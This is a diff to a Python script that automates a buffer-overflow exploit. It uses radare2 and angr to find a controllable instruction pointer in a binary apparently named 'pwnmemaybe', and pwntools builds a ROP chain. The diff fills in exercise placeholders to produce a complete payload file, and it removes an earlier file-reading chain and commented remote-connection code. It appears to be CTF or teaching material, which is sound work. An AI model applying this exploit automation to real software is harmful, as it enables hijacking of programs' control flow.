@@ -17,58 +17,19 @@ def fully_symbolic(state, variable):
 
     return True
 
-def check_continuity(address, addresses, length):
-    '''
-    dumb way of checking if the region at 'address' contains 'length' amount of controlled
-    memory.
-    '''
 
-    for i in range(length):
-        if not address + i in addresses:
-            return False
-
-    return True
-
-def find_symbolic_buffer(state, length):
-    '''
-    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
-    control
-
-    Are we overwriting more memory that we should have been allowed to
-    '''
-
-    # get all the symbolic bytes from stdin
-    stdin = state.posix.stdin
-
-    sym_addrs = [ ]
-    for _, symbol in state.solver.get_variables('file', stdin.ident):
-        sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))
-
-    for addr in sym_addrs:
-        if check_continuity(addr, sym_addrs, length):
-            yield addr
-
+# In this case, we want to go to a function within the program which should not be called under normal conditions. 
+# Therefore, we simply get the adress of that function in the intruction pointer
 def build_ropchain():
-    e = ELF("prog_test")
+    e = ELF("pwnmemaybe")
     write_target = e.bss()
     r = ROP([e])
 
-    # What is our objective here? Read a file and get the content sent back to us
-    r.call('open', [next(e.search(b'???')), 0])
-    r.call('read', [???, write_target, 100])
-    r.call('write', [???, write_target, 100])
-    r.call('exit', [0])
+    r.call('we_want_to_go_there', [0])
 
     # print(r.dump())
     return r
 
-# p = remote('::1', 8000)
-#p = remote('9000:ff:1ce:ff:216:3eff:fe8c:4a0c', 8000)
-#p.recvuntil(b"Password: ")
-#print("sending password")
-#p.sendline(b"What I'm trying to do is to maximise the probability of the future being better")
-#intro = p.recvline().decode()
-#print("Waiting for binary")
 
 done = 0
 while True:
@@ -76,19 +37,17 @@ while True:
     if done == 1:
         break
 
-    r2 = r2pipe.open('./prog_test')
-    # r2.cmd('aa')
+    # Step 1: Open with radare2 for automated analysis, find address of main function 
 
+    r2 = r2pipe.open('./pwnmemaybe')
     r2.cmd('s main')
     main_symbol_str = r2.cmd('is.')
     main_addr = int(main_symbol_str.splitlines()[-1].split()[2], 16)
 
-    project = angr.Project('./prog_test', selfmodifying_code=False, auto_load_libs=False)
+    # Step2: Open with Angr, start simulation manager at address found by radare2
+    project = angr.Project('./pwnmemaybe', selfmodifying_code=False, auto_load_libs=False)
     project.analyses.StaticHooker('libc.so.6')
 
-    r2.cmd('s main')
-    main_symbol_str = r2.cmd('is.')
-    main_addr = int(main_symbol_str.splitlines()[-1].split()[2], 16)
 
     es = project.factory.entry_state(addr=main_addr)
     sm = project.factory.simulation_manager(es, save_unconstrained=True)
@@ -97,6 +56,8 @@ while True:
     es = project.factory.entry_state(add_options=extras)
     sm = project.factory.simulation_manager(es, save_unconstrained=True)
 
+    # Step 3: have simulation manager step through the program until instruction pointer becomes symbolic
+    # Which would mean Angr took over instruction pointer
     # sys.set_int_max_str_digits(10000)
     exploitable_state = None
     print("Starting exploration")
@@ -118,26 +79,21 @@ while True:
     assert ep.solver.symbolic(ep.regs.pc), "PC must be symbolic at this point"
     print("success")
 
+    # Step 4: Add additionnal constraint to make sure we can have some specific value written in instruction pointer
     ep.add_constraints(ep.regs.pc == ep.solver.BVV(bytes.fromhex("4142434445464748")))
     if ep.satisfiable():
         payload_template = ep.posix.dumps(0)
         padding = payload_template.split(b"\x48\x47\x46\x45\x44\x43\x42\x41")[0]
 
+        # Step 5: Build ropchain, look at build_ropchain function
         r = build_ropchain()
-        # what shall our payload contain.
-        # hint: get the actual rop chain using r.chain()
-        payload = ??? + ???
 
+        # Last step: Save crafted input data for successful exploitation on disk
+        # Test exploitation with ./pwnmemaybe < payload
+        payload = padding + r.chain()
         with open("payload", 'wb') as fd:
             fd.write(payload)
 
 
-    #correct_input = payload
-    #print(base64.b64encode(correct_input).decode())
-    #p.sendline(base64.b64encode(correct_input).decode())
-    #msg = p.recvline()
-    #print(msg)
-    
-    # 
     done += 1
-    #print("Done:", done)
+    print("Done:", done)
